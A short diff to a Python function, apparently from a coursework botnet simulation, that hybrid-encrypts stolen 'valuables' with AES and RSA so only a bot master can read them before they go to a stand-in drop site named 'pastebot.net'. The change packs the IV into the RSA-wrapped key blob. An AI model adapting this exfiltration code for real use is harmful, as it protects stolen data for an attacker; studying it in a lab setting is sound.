@@ -41,13 +41,13 @@ def encrypt_for_master(data, fn):
     padded_data = ANSI_X923_pad(bytes(str(data), 'ascii'), AES.block_size)
     encrypted_data = cipher.encrypt(padded_data)
 
-    # Obtain public key from text file for encrypting aes encryption key
+    # Obtain public key from text file for encrypting aes encryption key and iv
     pub_key = open("mypublickey.txt", "r").read()
     rsa_encryption_key = RSA.importKey(pub_key)
-    encrypt_aes_key = rsa_encryption_key.encrypt(aes_encryption_key, 16)  # Encrypting aes key
-    print(encrypt_aes_key)
+    key_data = aes_encryption_key + iv
+    encrypt_aes_key = rsa_encryption_key.encrypt(key_data, 16)
 
-    # Store the aes encryption key
+    # Store the aes encryption key and iv
     aes_key_file = os.path.join("pastebot.net", fn + ".AES.key")
     out = open(aes_key_file, "wb")
     out.write(encrypt_aes_key[0])
@@ -55,7 +55,7 @@ def encrypt_for_master(data, fn):
 
     print("Exported AES key!")
 
-    return encrypted_data + iv
+    return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
